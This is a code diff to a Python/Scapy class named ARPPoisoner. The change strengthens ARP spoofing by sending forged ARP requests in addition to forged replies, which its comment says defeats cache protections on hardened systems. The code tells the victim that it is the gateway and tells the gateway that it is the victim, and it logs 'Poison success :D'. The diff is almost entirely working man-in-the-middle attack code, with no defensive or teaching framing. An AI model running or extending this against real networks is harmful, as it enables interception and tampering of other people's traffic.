@@ -62,32 +62,56 @@ class ARPPoisoner:
                 return
 
             # Tell the victim that we are the gateway.
-            victim_arp_poison = (
+            # 1. ARP Reply (is-at) - standard poisoning
+            victim_arp_reply = (
                 sc.Ether(dst=victim_mac) /
                 ARP(
-                    op=2,                     # ARP reply (is-at)
-                    pdst=self.victim_ip,      # Victim IP
-                    hwdst=victim_mac,         # Victim MAC
-                    psrc=self.gateway_ip,     # Claim to be gateway
-                    hwsrc=self.attacker_mac   # Our MAC
+                    op=2,
+                    pdst=self.victim_ip,
+                    hwdst=victim_mac,
+                    psrc=self.gateway_ip,
+                    hwsrc=self.attacker_mac
+                )
+            )
+            # 2. ARP Request (who-has) - forces cache update on some hardened OSs
+            victim_arp_req = (
+                sc.Ether(dst=victim_mac) /
+                ARP(
+                    op=1,
+                    pdst=self.victim_ip,
+                    hwdst=victim_mac,
+                    psrc=self.gateway_ip,
+                    hwsrc=self.attacker_mac
                 )
             )
 
             # Tell the gateway that we are the victim
-            gateway_arp_poison = (
+            gateway_arp_reply = (
                 sc.Ether(dst=gateway_mac) /
                 ARP(
-                    op=2,                     # ARP reply
-                    pdst=self.gateway_ip,     # Gateway IP
-                    hwdst=gateway_mac,        # Gateway MAC
-                    psrc=self.victim_ip,      # Claim to be victim
-                    hwsrc=self.attacker_mac   # Our MAC
+                    op=2,
+                    pdst=self.gateway_ip,
+                    hwdst=gateway_mac,
+                    psrc=self.victim_ip,
+                    hwsrc=self.attacker_mac
+                )
+            )
+            gateway_arp_req = (
+                sc.Ether(dst=gateway_mac) /
+                ARP(
+                    op=1,
+                    pdst=self.gateway_ip,
+                    hwdst=gateway_mac,
+                    psrc=self.victim_ip,
+                    hwsrc=self.attacker_mac
                 )
             )
 
-            # Send the poisoned packets
-            sc.send(victim_arp_poison, verbose=0, iface=self.interface)
-            sc.send(gateway_arp_poison, verbose=0, iface=self.interface)
+            # Send the poisoned packets (Both Reply and Request)
+            sc.sendp(victim_arp_reply, verbose=0, iface=self.interface)
+            sc.sendp(victim_arp_req, verbose=0, iface=self.interface)
+            sc.sendp(gateway_arp_reply, verbose=0, iface=self.interface)
+            sc.sendp(gateway_arp_req, verbose=0, iface=self.interface)
 
             log("Poison success :D")
 
